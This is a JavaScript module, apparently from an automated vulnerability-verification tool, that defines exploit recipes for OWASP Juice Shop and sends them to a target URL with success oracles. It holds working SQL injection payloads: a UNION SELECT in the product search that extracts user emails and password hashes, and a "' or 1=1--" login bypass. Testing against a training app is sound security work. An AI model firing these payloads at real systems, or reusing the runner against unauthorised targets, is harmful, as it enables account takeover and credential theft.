import { createHash } from 'node:crypto';

export const RECIPES = {
  R1: {
    id: 'R1',
    name: 'SQLi via Product Search',
    category: 'sqli',
    severity: 'critical',
    title: 'SQL Injection in /rest/products/search (q parameter)',
    method: 'GET',
    path: '/rest/products/search',
    param: 'q',
    param_location: 'query',
    exploit_request: {
      method: 'GET',
      url: "/rest/products/search?q=apple%27%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--",
      headers: {
        'Accept': 'application/json'
      },
      body: null
    },
    exploit_oracle: {
      success_status: [200],
      success_body_regex: '(admin@juice-sh.op|Users|UNION.*SELECT|[a-f0-9]{32})',
      success_header_regex: null
    }
  },
  R2: {
    id: 'R2',
    name: 'SQLi Authentication Bypass',
    category: 'sqli',
    severity: 'critical',
    title: 'SQL Injection in /rest/user/login (Authentication Bypass)',
    method: 'POST',
    path: '/rest/user/login',
    param: 'email',
    param_location: 'body_json',
    exploit_request: {
      method: 'POST',
      url: '/rest/user/login',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        email: "' or 1=1--",
        password: "x"
      })
    },
    exploit_oracle: {
      success_status: [200],
      success_body_regex: '(authentication|token|umail)',
      success_header_regex: null
    }
  }
};

export function computeDedupeKey(method, path, param) {
  const norm = `${method.toUpperCase()}:${path.toLowerCase()}:${(param || '').toLowerCase()}`;
  return createHash('sha256').update(norm).digest('hex').slice(0, 16);
}

/**
 * Fires an exploit recipe at a bare target URL and checks if the oracle confirms the vulnerability
 */
export async function executeRecipe(recipeId, targetBaseUrl) {
  const recipe = RECIPES[recipeId];
  if (!recipe) {
    throw new Error(`Unknown recipe: ${recipeId}`);
  }

  const base = (targetBaseUrl || process.env.TARGET_URL || 'http://localhost:3001').replace(/\/$/, '');
  const reqSpec = recipe.exploit_request;
  const targetUrl = `${base}${reqSpec.url}`;

  let status = null;
  let bodyText = '';
  let confirmed = false;

  try {
    const fetchOptions = {
      method: reqSpec.method,
      headers: reqSpec.headers || {},
      signal: AbortSignal.timeout(5000)
    };
    if (reqSpec.body) {
      fetchOptions.body = typeof reqSpec.body === 'string' ? reqSpec.body : JSON.stringify(reqSpec.body);
    }

    const res = await fetch(targetUrl, fetchOptions);
    status = res.status;
    bodyText = await res.text();

    const oracle = recipe.exploit_oracle;
    const statusMatch = !oracle.success_status || oracle.success_status.includes(status);
    const bodyMatch = !oracle.success_body_regex || new RegExp(oracle.success_body_regex, 'i').test(bodyText);

    if (statusMatch && bodyMatch) {
      confirmed = true;
    }
  } catch (err) {
    // If target is unreachable in local offline test environment
    bodyText = `Target unreachable: ${err.message}`;
  }

  return {
    recipe_id: recipeId,
    target_url: targetUrl,
    confirmed,
    status_code: status,
    evidence: bodyText.slice(0, 1500),
    exploit_request: reqSpec,
    exploit_oracle: recipe.exploit_oracle
  };
}
